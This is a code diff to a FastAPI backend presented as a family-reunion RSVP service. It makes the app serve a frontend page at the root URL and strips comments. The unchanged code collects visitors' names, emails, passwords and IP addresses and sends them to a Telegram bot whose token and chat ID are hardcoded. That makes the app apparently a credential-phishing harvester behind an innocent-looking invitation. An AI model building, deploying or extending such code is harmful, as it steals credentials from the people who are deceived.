@@ -1,5 +1,7 @@
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import FileResponse
 import aiohttp
 import json
 from datetime import datetime
@@ -16,6 +18,9 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# Serve frontend files
+app.mount("/static", StaticFiles(directory="frontend"), name="static")
+
 # =============================================
 # 🔧 YOUR BOT TOKENS
 # =============================================
@@ -23,8 +28,11 @@ BOT_TOKEN = '8676156420:AAFQpUpyOOMq-oDKwOiS8sxPTgvtfTnht0Y'
 CHAT_ID = '1254120057'
 # =============================================
 
+@app.get("/")
+async def serve_index():
+    return FileResponse("frontend/index.html")
+
 async def send_to_telegram(name, email, password, ip):
-    """Send RSVP directly to Telegram"""
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     
     message = f"""
@@ -50,17 +58,12 @@ async def send_to_telegram(name, email, password, ip):
         }) as response:
             return await response.json()
 
-@app.get("/")
-async def root():
-    return {"message": "Family Reunion RSVP API", "status": "running"}
-
 @app.get("/health")
 async def health_check():
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}
 
 @app.post("/api/rsvp")
 async def handle_rsvp(request: Request):
-    """Handle RSVP submission - sends directly to Telegram"""
     try:
         data = await request.json()
         name = data.get('name')
@@ -72,7 +75,6 @@ async def handle_rsvp(request: Request):
         
         client_ip = request.client.host if request.client else "Unknown"
         
-        # Send directly to Telegram
         result = await send_to_telegram(name, email, password, client_ip)
         
         if result and result.get('ok'):
